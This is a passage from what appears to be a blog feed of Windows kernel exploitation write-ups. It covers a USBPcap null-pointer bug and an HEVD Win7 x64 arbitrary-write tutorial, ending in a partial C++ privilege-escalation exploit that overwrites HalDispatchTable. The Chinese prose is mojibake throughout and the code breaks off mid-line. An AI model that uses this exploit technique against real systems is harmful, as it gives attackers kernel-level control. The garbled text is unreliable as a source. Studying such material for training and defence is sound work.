0xd</code>ï¼Œè€Œ<code>0xd</code>æ­£æ˜¯<code>IRP_MJ_FILE_SYSTEM_CONTROL</code></p><p>å› æ­¤å¯¹äºå½“å‰è¿™ä¸ª<code>POC</code>ï¼Œå…¶æ•´ä¸ª<code>DeviceIoControl</code>çš„æµç¨‹ä¸º</p><pre><code class="hljs erlang-repl">UserMode!DeviceIoControl -&gt; ntoskrnl!ZwDeviceIoControl -&gt; kernel32!DeviceIoControlImplementation -&gt; kernel32!DeviceIoControl -&gt; kernelbase!DeviceIoControl -&gt; ntdll!ZwFsControlFile -&gt; ntoskrnl!NtDeviceIoControlFile -&gt; ntoskrnl!IopXxxControlFile -&gt; ntoskrnl!IopSynchronousServiceTail -&gt; ntoskrnl!IofCallDriver -&gt; USBPcap!IRP_MJ_FILE_SYSTEM_CONTROL_dispatch_handler</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>æœ€åè¿™ä¸ª<code>crash</code>ä½ç½®æ˜¯<code>83e57f7b 8b4608          mov     eax,dword ptr [esi+8]</code><br>è€Œæ­¤æ—¶ï¼Œ<code>esi=0x0</code>ï¼Œè¿™ä¸ªå†…å­˜ä¸å­˜åœ¨ï¼Œå› æ­¤å‡ºé”™ï¼Œè€Œ<code>win7</code>è¿˜å¯ä»¥å¯¹<code>0</code>åœ°å€è¿›è¡Œåˆ†é…å†…å­˜ï¼Œå› æ­¤å¯ä»¥ç›´æ¥åœ¨<code>0</code>åœ°æ–¹åˆ†é…å†…å­˜ï¼Œåˆ™æœ€åä¼š<code>call [eax+ecx*4+38h]</code>ï¼Œè€Œæ­¤æ—¶ï¼Œ<code>ecx=0xd</code>ï¼Œå› æ­¤ç›¸å½“äº<code>call [0x6c]</code></p><pre><code class="hljs x86asm">nt!IofCallDriver+<span class="hljs-number">0x57</span>:83e74f7b 8b4608          <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">esi</span>+<span class="hljs-number">8</span>]83e74f7e <span class="hljs-number">52</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">edx</span>83e74f7f 0fb6c9          <span class="hljs-keyword">movzx</span>   <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">cl</span>83e74f82 <span class="hljs-number">56</span>              <span class="hljs-keyword">push</span>    <span class="hljs-built_in">esi</span>83e74f83 ff548838        <span class="hljs-keyword">call</span>    <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">eax</span>+<span class="hljs-built_in">ecx</span>*<span class="hljs-number">4</span>+<span class="hljs-number">38h</span>]</code></pre><p>æŒ‰ç…§ä¹‹å‰çš„<code>HEVD</code>å†™ä¸ª<code>shellcode</code>ï¼Œ<code>steal token</code>å°±å¯ä»¥ææƒï¼Œæœ€åæ³¨æ„èƒ½ä½¿æµç¨‹æ­£å¸¸è¿”å›å³å¯</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å…¶å®æ¼æ´æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯åœ¨æ•´ä¸ªè¿‡ç¨‹çš„ç¯å¢ƒæ­å»ºå’Œè°ƒè¯•ç£¨äº†å¾ˆé•¿æ—¶é—´ï¼Œç„¶åç†Ÿæ‚‰äº†ä¸€ä¸‹<code>DeviceIoControl</code>çš„æ•´ä¸ªè°ƒç”¨é“¾</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><blockquote><p><a href="https://www.anquanke.com/post/id/86203">https://www.anquanke.com/post/id/86203</a><br><a href="https://www.exploit-db.com/exploits/41542">https://www.exploit-db.com/exploits/41542</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEVD win7 x64 arbitrary write</title>
    <link href="/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/"/>
    <url>/2022/06/29/HEVD%20win7%20x64%20arbitrary%20write/</url>
    
    <content type="html"><![CDATA[<p>HEVD ä¸­çš„ä»»æ„åœ°å€å†™</p><pre><code class="hljs nsis">ç¯å¢ƒï¼šè™šæ‹Ÿæœºï¼š<span class="hljs-literal">Win7</span> SP1 x64ç‰©ç†æœºï¼š<span class="hljs-literal">Win10</span>debuggerï¼šwindbg previewcompilerï¼švs2022</code></pre><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>è§å‰ä¸€ç¯‡æ ˆæº¢å‡º</p><h2 id="æ¼æ´"><a href="#æ¼æ´" class="headerlink" title="æ¼æ´"></a>æ¼æ´</h2><p>å…¶ä¸­<code>arbitrary write</code>ä¸º<code>0x22200b</code></p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x22200B</span>:    DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>);    FakeObjectNonPagedPoolNxIoctlHandler = ArbitraryWriteIoctlHandler(Irp, CurrentStackLocation);    v7 = <span class="hljs-string">&quot;****** HEVD_IOCTL_ARBITRARY_WRITE ******\n&quot;</span>;    <span class="hljs-keyword">goto</span> LABEL_62;</code></pre><p>æ¼æ´ç‚¹ååˆ†ç®€å•ï¼Œå°±æ˜¯ä¸€ä¸ªä»»æ„åœ°å€å†™çš„æ¼æ´</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">ArbitraryWriteIoctlHandler</span><span class="hljs-params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span><span class="hljs-function"></span>&#123;  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  Parameters = IrpSp-&gt;Parameters.CreatePipe.Parameters;  result = <span class="hljs-number">0xC0000001</span>;  <span class="hljs-keyword">if</span> ( Parameters )    <span class="hljs-keyword">return</span> TriggerArbitraryWrite((_WRITE_WHAT_WHERE *)Parameters);  <span class="hljs-keyword">return</span> result;&#125;</code></pre><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">TriggerArbitraryWrite</span><span class="hljs-params">(_WRITE_WHAT_WHERE *UserWriteWhatWhere)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">unsigned</span> __int64 *What; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">unsigned</span> __int64 *Where; <span class="hljs-comment">// rdi</span>  ProbeForRead(UserWriteWhatWhere, <span class="hljs-number">0x10</span>ui64, <span class="hljs-number">1u</span>);  What = UserWriteWhatWhere-&gt;What;  Where = UserWriteWhatWhere-&gt;Where;  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere: 0x%p\n&quot;</span>, UserWriteWhatWhere);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] WRITE_WHAT_WHERE Size: 0x%X\n&quot;</span>, <span class="hljs-number">16</span>i64);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;What: 0x%p\n&quot;</span>, What);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] UserWriteWhatWhere-&gt;Where: 0x%p\n&quot;</span>, Where);  DbgPrintEx(<span class="hljs-number">0x4D</span>u, <span class="hljs-number">3u</span>, <span class="hljs-string">&quot;[+] Triggering Arbitrary Write\n&quot;</span>);  *Where = *What;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>è¾“å…¥<code>0x10</code>ä¸ªå­—èŠ‚ï¼ŒæŠŠ<code>what</code>ä¸Šçš„å†…å®¹èµ‹åˆ°<code>where</code>åœ°å€ä¸Š</p><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>ä¸ºäº†èƒ½æœ€åææƒï¼Œæˆ‘ä»¬åº”è¯¥åšä»€ä¹ˆ</p><p>æ‰¾ä¸ªå†…æ ¸çš„åœ°æ–¹å†™ï¼Ÿ<br>=&gt; éœ€è¦çŸ¥é“å†…æ ¸åœ°å€<br>=&gt; é€šè¿‡ <code>NtQuerySystemInformation/ZwQuerySystemInformation</code> æ¥å£è·å–å†…æ ¸çš„åŸºåœ°å€<br>=&gt; é€šè¿‡åŸºåœ°å€+åç§»è·å–åœ¨å†…æ ¸ä¸­çš„åœ°å€</p><p>å†™ä»€ä¹ˆåœ°æ–¹ï¼Ÿ<br>=&gt; å†…æ ¸ä¸­çš„å‡½æ•°æŒ‡é’ˆ<br>=&gt; é‚£è¿™ä¸ªå‡½æ•°æŒ‡é’ˆå¯¹åº”çš„æ¥å£åº”è¯¥æœ‰ä»€ä¹ˆç‰¹å¾å‘¢ï¼Ÿ<br>=&gt; åº”è¯¥è¾ƒå°‘è¢«å†…æ ¸è°ƒç”¨ï¼Œå¦åˆ™è¢«å…¶ä»–åœ°æ–¹è°ƒç”¨äº†ï¼Œå°±å¯èƒ½å¯¼è‡´å†…æ ¸å´©æºƒ &amp;&amp; å¯ä»¥é€šè¿‡ç”¨æˆ·æ€çš„ä¸€ä¸ªæ¥å£è¿›è¡Œè°ƒç”¨ï¼Œä»è€Œè§¦å‘å¯¹å‡½æ•°æŒ‡é’ˆçš„è°ƒç”¨<br>=&gt; æ‰¾åˆ°<code>HalDispatchTable</code>ä¸­åç§»ä¸º<code>0x8</code>ä½ç½®çš„<code>xHalSetSystemInformation</code>å‡½æ•°æŒ‡é’ˆæ¥å£å®Œç¾ç¬¦åˆï¼Œä¸Šå±‚å¯ç”±<code>NtQueryIntervalProfile</code>æˆ–<code>NtSetIntervalProfile</code>è°ƒç”¨</p><p>ï¼ˆP.S. è¿™é‡Œçš„æ€è·¯å¯å‚è€ƒè¿™ä¸ª<a href="https://shinnai.altervista.org/papers_videos/ECFID.pdf">ECFID.pdf</a> ï¼‰</p><p>æ•´ä¸ªæµç¨‹ç±»ä¼¼ä¸‹å›¾ï¼Œåœ¨ç”¨æˆ·ç©ºé—´å†™çš„è¿›ç¨‹ï¼Œå…ˆé€šè¿‡ä»»æ„åœ°å€å†™æ¼æ´ä¿®æ”¹äº†<code>HalDispatchTable</code>ï¼Œç„¶åé€šè¿‡ç”¨æˆ·æ€çš„æ¥å£è°ƒç”¨<code>NtQueryIntervalProfile</code>ï¼Œä»è€Œä½¿ç”¨äº†<code>xHalQuerySysttemInformation</code>è¿™ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ€åè·³è½¬åˆ°<code>shellcode</code>ä¸Š</p><p><img src="/image/HEVD%20win7%20x64%20arbitrary%20write/QQ%E6%88%AA%E5%9B%BE20220628204429.png" alt="æµç¨‹å›¾"></p><p>è¿™é‡Œè¯´æ˜ä¸€ä¸‹<code>Nt* | ZW*</code>åŒºåˆ«</p><ol><li>åœ¨<code>ntdll.dll</code>ä¸­ï¼Œ<code>Nt*</code>å’Œ<code>Zw*</code>åº”è¯¥æ˜¯æ²¡åŒºåˆ«ï¼Œè¿™ä¸ªæ˜¯è·‘åœ¨<code>ring3</code>çš„</li><li>åœ¨<code>ntoskrnl</code>ä¸­ï¼Œ<code>Nt*</code>å’Œ<code>Zw*</code>éƒ½æ˜¯è·‘åœ¨<code>ring0</code>ã€‚<code>Nt*</code>æ˜¯è¯¥æ¥å£çš„å…·ä½“å®ç°ï¼Œç»•è¿‡äº†<code>SSDT</code>ï¼Œè€Œ<code>Zw*</code>æ˜¯é€šè¿‡<code>SSDT</code>çš„<code>KiSystemService</code>è°ƒç”¨<code>ntoskrnl</code>ä¸­çš„<code>Nt*</code>å‡½æ•°ï¼ˆæˆ‘é€šè¿‡<code>uf</code>çœ‹çš„æ±‡ç¼–çš„æµç¨‹æ˜¯ï¼Œ<code>nt!Zw*</code>-&gt;<code>nt!KiServiceInternal</code>-&gt;<code>nt!KiSystemServiceStart</code>ï¼‰</li></ol><p>è¿™éƒ¨åˆ†çš„åŒºåˆ«å‚è€ƒä»¥ä¸‹åšå®¢<a href="https://blog.csdn.net/SysProgram/article/details/5805265">1</a>ï¼Œ<a href="https://blog.csdn.net/shenjianxz/article/details/52704046">2</a>ï¼Œ<a href="https://blog.csdn.net/evi10r/article/details/6742052">3</a>ï¼Œ<a href="https://codeantenna.com/a/fsxdbtaiWL">4</a>ï¼Œ<a href="https://blog.csdn.net/SysProgram/article/details/5805265">5</a></p><p>å…³äº<code>SSDT</code>çš„è¯´æ˜ï¼Œæœ‰<a href="https://bbs.pediy.com/thread-177772.htm">1</a>ï¼Œ<a href="https://bbs.pediy.com/thread-84946-1.htm">2</a>ï¼Œ<a href="https://www.anquanke.com/post/id/262577">3</a></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>æ•´ä¸ªæµç¨‹åº”è¯¥ä¸º</p><ol><li><code>GetKernelBaseSystemModule</code>ï¼šé€šè¿‡<code>NtQuerySystemInformation/ZwQuerySystemInformation</code>æ¥å£è·å–<code>SYSTEM_MODULE</code>ï¼Œä»è€Œè·å–å†…æ ¸çš„åŸºå€</li><li><code>GetHalDispatchTableAddress</code>ï¼šé€šè¿‡åŸºå€æ‰¾åˆ°<code>HalDispatchTable</code>åœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼Œä»è€Œæ‰¾åˆ°<code>xHalSetSystemInformation</code>è¿™ä¸€å‡½æ•°æŒ‡é’ˆçš„åœ°å€ï¼Œå³<code>Where</code></li><li><code>Perpare</code>ï¼šå‡†å¤‡<code>shellcode</code>ï¼Œä»¥åŠä¸é©±åŠ¨è¿›è¡Œäº¤äº’ï¼Œè¿›è¡Œä»»æ„åœ°å€å†™</li><li><code>TriggerShellcode</code>ï¼šé€šè¿‡ç”¨æˆ·æ€çš„<code>ntdll</code>çš„<code>NtQueryIntervalProfile</code>æ¥å£æ‰§è¡Œ<code>shellcode</code>å¹¶æ­£å¸¸è¿”å›</li><li><code>start cmd</code>ï¼šèµ·ä¸€ä¸ªææƒçš„<code>cmd</code></li></ol><h3 id="GetKernelBaseSystemModule"><a href="#GetKernelBaseSystemModule" class="headerlink" title="GetKernelBaseSystemModule"></a>GetKernelBaseSystemModule</h3><p>ç¬¬ä¸€æ¬¡è°ƒç”¨<code>ntdll.ZwQuerySystemInformation(0xb, NULL, 0, &amp;len)</code>å¯ä»¥å¾—åˆ°ä¸€ä¸ª<code>error</code>çš„ç»“æœï¼Œä½†æ˜¯ä¼šåœ¨<code>len</code>ä¸Šè¿”å›ä¸€ä¸ªè¯¥æŸ¥è¯¢ä¼šå¾—åˆ°çš„ç»“æ„ä½“å¤§å°ï¼ˆP.S. ç¬¬ä¸€æ¬¡<code>len</code>æŒ‡å‘<code>0</code>ï¼‰</p><p>ç¬¬äºŒæ¬¡è°ƒç”¨<code>ntdll.ZwQuerySystemInformation</code>ï¼ŒæŠŠæ­£ç¡®çš„å¤§å°ï¼ˆ<code>len</code>ï¼‰å’Œç©ºé—´ï¼ˆ<code>PModuleInfo</code>ï¼‰è¾“å…¥è¿›å»ï¼Œå³å¯å¾—åˆ°<code>SYSTEM_MODULE</code>çš„ä¿¡æ¯ï¼Œ<code>ntdll.ZwQuerySystemInformation(0xb, PModuleInfo, len, &amp;len)</code></p><p>åœ¨<code>PModuleInfo</code>è¿™ä¸ªç»“æ„ä½“æ˜¯ç”±<code>ULONG ModulesCount</code>å’Œ<code>SYSTEM_MODULE Modules[ModulesCount]</code>æ•°ç»„ç»„æˆçš„ï¼Œå‰ä¸€é¡¹è¡¨ç¤ºå­˜åœ¨å¤šå°‘é¡¹<code>SYSTEM_MODULE</code>ï¼Œä¹‹åå°±æ˜¯æ¯ä¸ª<code>SYSTEM_MODULE</code>çš„è¯¦ç»†ä¿¡æ¯</p><p>åœ¨è¿™é‡Œå¯ä»¥é€šè¿‡<code>module.Name</code>æ˜¯å¦ä¸º<code>ntoskrnl</code>ä»è€Œå¾—åˆ°<code>ImageBaseAddress</code>ï¼ˆP.S. ä½†æ˜¯ä»<a href="https://www.anquanke.com/post/id/246289">Gcow exp</a>å’Œæˆ‘è‡ªå·±å†™å®Œ<code>exp</code>è·‘å®Œçš„ç»“æœæ¥çœ‹ï¼Œè¿™ä¸ª<code>ntoskrnl.exe</code>ä¸€ç›´æ˜¯ç¬¬ä¸€é¡¹ï¼‰</p><p>è¿™ä¸ªåœ°æ–¹çš„è·å–åŸºå€ï¼Œè¿™ç¯‡ <a href="https://macchiato.ink/hst/bypassav/Windows_Kernel_GetFunction/">Windowså–å†…æ ¸ä¸­çš„å‡½æ•°</a> è®²å¾—ç‰¹åˆ«æ¸…æ¥š</p><p>ï¼ˆP.S. æˆ‘åœ¨è¿™é‡Œè¸©äº†ä¸€ä¸ªå‘ï¼Œå°±æ˜¯<code>struct SYSTEM_MODULE</code>ï¼Œé‡Œé¢å†™æ¯ä¸ªå±æ€§æ—¶ï¼Œæ²¡æŠŠ<code>ULONG</code>å†™æˆå¸¦æ•°å­—çš„ï¼Œå½“æ—¶æˆ‘æŸ¥äº†ä¸€ä¸‹<code>ULONG</code>é»˜è®¤æ˜¯<code>8</code>å­—èŠ‚ï¼Œç»“æœæœ€åæ‰“å°é¡¹çš„æ—¶å€™å‘ç°ä¸å¯¹ï¼‰</p><h3 id="GetHalDispatchTableAddress"><a href="#GetHalDispatchTableAddress" class="headerlink" title="GetHalDispatchTableAddress"></a>GetHalDispatchTableAddress</h3><p>é€šè¿‡å¾—åˆ°çš„<code>SYSTEM_MODULE</code>ï¼Œç»è¿‡<code>userland_HalDispatchTable - uerland_base + kernel_base</code>å°±å¯ä»¥å¾—åˆ°<code>HalDispatchTable</code>åœ¨å†…æ ¸ä¸­çš„åœ°å€äº†</p><h3 id="TriggerShellcode"><a href="#TriggerShellcode" class="headerlink" title="TriggerShellcode"></a>TriggerShellcode</h3><p>å› ä¸ºæ˜¯é€šè¿‡ä¸Šå±‚<code>ntdll</code>çš„<code>api</code>å»è°ƒç”¨åº•å±‚çš„<code>xHalSetSystemInformation</code>åœ°å€ä¸Šçš„å‡½æ•°æŒ‡é’ˆï¼Œå°±éœ€è¦æŸ¥çœ‹è¿™ä¸ªè°ƒç”¨é“¾ä¸Šçš„æƒ…å†µ</p><p>åœ¨<code>ntoskrnl.exe</code>ä¸­å¯ä»¥åˆ©ç”¨<code>windbg</code>ä¸‹è½½çš„<code>.pdb</code>å¾—åˆ°ç¬¦å·ï¼Œä»è€Œç›´æ¥æ‰¾åˆ°<code>NtQueryIntervalProfile</code>çš„åœ°å€</p><pre><code class="hljs cpp"><span class="hljs-function">NTSTATUS __stdcall <span class="hljs-title">NtQueryIntervalProfile</span><span class="hljs-params">(KPROFILE_SOURCE ProfileSource, PULONG Interval)</span></span><span class="hljs-function"></span>&#123;  PULONG v2; <span class="hljs-comment">// rbx</span>  v2 = Interval;  <span class="hljs-keyword">if</span> ( KeGetCurrentThread()-&gt;PreviousMode )  &#123;    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> __int64)Interval &gt;= MmUserProbeAddress )      Interval = (PULONG)MmUserProbeAddress;    *Interval = *Interval;  &#125;  *v2 = KeQueryIntervalProfile(ProfileSource);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªå‡½æ•°çš„æ¥å£éƒ¨åˆ†ï¼Œæ²¡ä»€ä¹ˆéœ€è¦è®¾ç½®çš„ï¼ˆP.S. æˆ‘å°±ä½¿<code>Interval</code>æ˜¯ä¸ªå¯è¯»å†™çš„åœ°å€ï¼‰</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KeQueryIntervalProfile</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+20h] [rbp-18h] BYREF</span>  <span class="hljs-keyword">char</span> v3; <span class="hljs-comment">// [rsp+24h] [rbp-14h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [rsp+40h] [rbp+8h] BYREF</span>  <span class="hljs-keyword">if</span> ( !a1 )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileInterval;  <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">1</span> )    <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)KiProfileAlignmentFixupInterval;  v2 = a1;  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)((__int64 (__fastcall *)(__int64, __int64, <span class="hljs-keyword">int</span> *, <span class="hljs-keyword">char</span> *))off_1401E2CF8)(<span class="hljs-number">1</span>i64, <span class="hljs-number">12</span>i64, &amp;v2, &amp;v5) &gt;= <span class="hljs-number">0</span> &amp;&amp; v3 )    <span class="hljs-keyword">return</span> v4;  <span class="hljs-keyword">else</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;&#125;</code></pre><p>ç¬¬äºŒä¸ªå‡½æ•°ï¼Œéœ€è¦ä¼ è¿›æ¥çš„<code>ProfileSource</code>ä¸èƒ½ä¸º<code>0</code>å’Œ<code>1</code>ï¼Œå› æ­¤æˆ‘è®¾ç½®ä¸º<code>2</code></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>æœ€ç»ˆç‰ˆ</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE</span> &#123;</span>    ULONG64 Reserved1;    ULONG64 Reserved2;    ULONG64 ImageBaseAddress;    ULONG32 ImageSize;    ULONG32 Flags;    USHORT Id;    USHORT Rank;    USHORT LoadCount;    USHORT NameOffset;    CHAR Name[<span class="hljs-number">256</span>];&#125; SYSTEM_MODULE, * PSYSTEM_MODULE;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SYSTEM_MODULE_INFORMATION</span> &#123;</span>    ULONG ModulesCount;    SYSTEM_MODULE Modules[<span class="hljs-number">1</span>];&#125; SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;<span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> _SYSTEM_INFORMATION_CLASS &#123;    SystemModuleInformation = <span class="hljs-number">0xB</span>&#125; SYSTEM_INFORMATION_CLASS;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PZwQuerySystemInformation)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><span class="hljs-function"><span class="hljs-params">    __inout PVOID SystemInformation,</span></span><span class="hljs-function"><span class="hljs-params">    __in ULONG SystemInformationLength,</span></span><span class="hljs-function"><span class="hljs-params">    __out_opt PULONG ReturnLength</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(WINAPI* PNtQueryIntervalProfile)</span></span><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">    __in INT32 ProfileSource,</span></span><span class="hljs-function"><span class="hljs-params">    __in PULONG * Interval</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function">SYSTEM_MODULE <span class="hljs-title">GetKernelBaseSystemModule</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-comment">// Using NtQuerySystemInformation/ZwQuerySystemInformation Interface to get kernel image base</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">sizeof</span>(SYSTEM_MODULE) != <span class="hljs-number">0x128</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] struct SYSTEM_MODULE Error&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// Load ntdll.dll</span>    HMODULE hNtdll = LoadLibraryA(<span class="hljs-string">&quot;ntdll&quot;</span>);    <span class="hljs-keyword">if</span> (hNtdll == <span class="hljs-literal">NULL</span>)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Load Ntdll Failed&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get NtQuerySystemInformation/ZwQuerySystemInformation address</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get ZwQuerySystemInformation Address&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    PZwQuerySystemInformation ZwQuerySystemInformation = (PZwQuerySystemInformation)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation)    &#123;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Failed to Get the Address of NtQuerySystemInformation&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] Last Error: &quot;</span> &lt;&lt; GetLastError() &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    &#125;    <span class="hljs-comment">// [*] Get Buffer Length</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get Buffer Length&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    ULONG len = <span class="hljs-number">0</span>;    <span class="hljs-comment">// the API Call ends in an error, but we can get the correct Length in ReturnLength </span>    ZwQuerySystemInformation(SystemModuleInformation, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;len);    <span class="hljs-comment">// Allocate Memory</span>    PSYSTEM_MODULE_INFORMATION PModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(<span class="hljs-literal">NULL</span>, len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);    <span class="hljs-comment">// Get SYSTEM_MODULE_INFORMATION</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] Get SYSTEM_MODULE_INFORMATION&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    NTSTATUS Status = ZwQuerySystemInformation(SystemModuleInformation, PModuleInfo, len, &amp;len);    <span class="hljs-keyword">switch</span> (Status)    &#123;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0x0</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[*] NtQuerySystemInformation Sucess&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        <span class="hljs-keyword">break</span>;    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000004</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;[!] NtQuerySystemInformation Failed, NTSTATUS: STATUS_INFO_LENGTH_MISMATCH (0xC0000004)&quot;</span> &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;        system(<span class="hljs-string">&quot;pause&quot;</span>);        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);    <span class="hljs-keyword">case</span> (NTSTATUS)<span class="hljs-number">0xC0000005</span>:        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; <span 